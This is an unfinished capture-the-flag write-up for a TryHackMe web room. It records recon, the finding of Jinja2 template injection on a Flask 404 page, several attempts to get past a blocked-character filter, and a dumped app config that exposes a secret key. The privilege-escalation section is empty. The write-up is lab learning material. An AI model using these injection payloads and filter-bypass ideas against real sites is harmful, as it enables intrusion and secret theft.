# Tryhackme.com Room : Vulnet Dotpy

`https://tryhackme.com/room/vulnnetdotpy`

## Instance

```bash
export IP="10.10.137.74"
```

## Nmap

```
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.137.74:8080/login
```

## Initial Foothold

When browsing the website, we get to a login screen.



There is a contact us link which link to `hello@vulnnet.com`

Let's add `vulnnet.com` to our host file.

Maybe this email address can be used to send an XSS payload later on ?



The forgot password link doesn't work, let's create a user

```
user:password
```

We get to an analytics dashboard named `staradmin`. 

but its just a template, we can't really do anything except logging out



When trying to access `vulnnet.com:8080/robots.txt` we get

```
INVALID CHARACTERS DETECTED
Your request has been blocked.
If you think this is an issue contact us at support@vulnnet.com
ID: 1c36bc623da792fa41c832ne 
```

Seems like this happen when `.txt` or `.php` is in the url.

Actually, seems like when we have a `.` followed by anything.

Actually, some `.html` file works, so seems like we get a `403` if we add an extension and the file doesn't exist. (Those route are also accessible without the `.html` ex : `/icons` & `/icons.html`)



We have the following `session` cookie:

```
.eJwtzjFuA0EIheG7TJ1igWEAX2Y1DCBbkRJp166i3N2rKOX7m_f9tL2OPO_t9jxe-dH2R7Rbgy6TS9MYN1YDHt7DSWXJlZkjXGxELYMcCj7QQhWJNTWzj6A-AWaw0IKcgkTMPLsz51iyIn1V1NBOJprhPjdMIVBA1V7tgrzOPP4111znUfvz-zO__nibKSwUVrJpOFDr-nSAtA6h3NHRK9rvG5W3Pmo.YIsm3w.CpnX_r4kvf7qwlVEBr84HkD_Uzo
```

Maybe this can tell us information on the framework used ?



We have control over the `email` variable which is printed in the profil popup.

Not vulnerable to xss, but might be vulnerable to template injection ?

didn't work with `{{7*7}}` and variations

Hmm, tried to inject the `username` as well but didn't work



If we put random values in the cookie we get at `403 Access denied` 



Lookig at the request headers we see that it is served by

```
Werkzeug/1.0.1 Python/3.6.9
```



We can get code execution on the `404` page ! 

`vulnet.com:8080/{{7*7}}` show `49`

`/{{}}` give us a `jinja2.exceptions.TemplateSyntaxError` stacktrace



The server run from `/home/web/shuriken-dotpy/app/home/routes.py`

We see the following code

```
try:
    if not template.endswith( '.html' ):
        template += '.html'
    return render_template( template )

except TemplateNotFound:
    s = request.path.strip("/")
    if "." in s or "_" in s or "[" in s or "]" in s:
        template = '''
```

We see that the following characters trigger the `INVALID characters` error :

```
.
_
[
]
```

We can execute code but we got to find a way to execute something usefull without these.. 

hmm might prove challenging...



Tried this

```
/{{import os; pwn=getattr(os,'popen');getattr(pwn('ls'),'read')()}}
```

seems like we can't have spaces



```
/{{getattr(getattr(os,'popen')('ls'),'read')()}}
```

getattr is undefined



```
/{{os|attr('popen')}}
```

We can access the attribute but `os` is undefined



hmm doesn't seem like we can `import` stuff inside jinja2...

Another way would be to access `__class__` attributes of string and retrive some function but we can't use `_` .

Hmmm



We can dump the config object

```
{
   'ENV':'production',
   'DEBUG':True,
   'TESTING':False,
   'PROPAGATE_EXCEPTIONS':None,
   'PRESERVE_CONTEXT_ON_EXCEPTION':None,
   'SECRET_KEY':'S3cr3t_K#Key',
   'PERMANENT_SESSION_LIFETIME':datetime.timedelta(31),
   'USE_X_SENDFILE':False,
   'SERVER_NAME':None,
   'APPLICATION_ROOT':'/',
   'SESSION_COOKIE_NAME':'session',
   'SESSION_COOKIE_DOMAIN':False,
   'SESSION_COOKIE_PATH':None,
   'SESSION_COOKIE_HTTPONLY':True,
   'SESSION_COOKIE_SECURE':False,
   'SESSION_COOKIE_SAMESITE':None,
   'SESSION_REFRESH_EACH_REQUEST':True,
   'MAX_CONTENT_LENGTH':None,
   'SEND_FILE_MAX_AGE_DEFAULT':datetime.timedelta(0,
   43200),
   'TRAP_BAD_REQUEST_ERRORS':None,
   'TRAP_HTTP_EXCEPTIONS':False,
   'EXPLAIN_TEMPLATE_LOADING':False,
   'PREFERRED_URL_SCHEME':'http',
   'JSON_AS_ASCII':True,
   'JSON_SORT_KEYS':True,
   'JSONIFY_PRETTYPRINT_REGULAR':False,
   'JSONIFY_MIMETYPE':'application/json',
   'TEMPLATES_AUTO_RELOAD':None,
   'MAX_COOKIE_SIZE':4093,
   'SQLALCHEMY_DATABASE_URI':'sqlite:////home/web/shuriken-dotpy/db.sqlite3',
   'SQLALCHEMY_TRACK_MODIFICATIONS':False,
   'SQLALCHEMY_BINDS':None,
   'SQLALCHEMY_NATIVE_UNICODE':None,
   'SQLALCHEMY_ECHO':False,
   'SQLALCHEMY_RECORD_QUERIES':None,
   'SQLALCHEMY_POOL_SIZE':None,
   'SQLALCHEMY_POOL_TIMEOUT':None,
   'SQLALCHEMY_POOL_RECYCLE':None,
   'SQLALCHEMY_MAX_OVERFLOW':None,
   'SQLALCHEMY_COMMIT_ON_TEARDOWN':False,
   'SQLALCHEMY_ENGINE_OPTIONS':{
      
   }
}
```



## Priv esc



## End

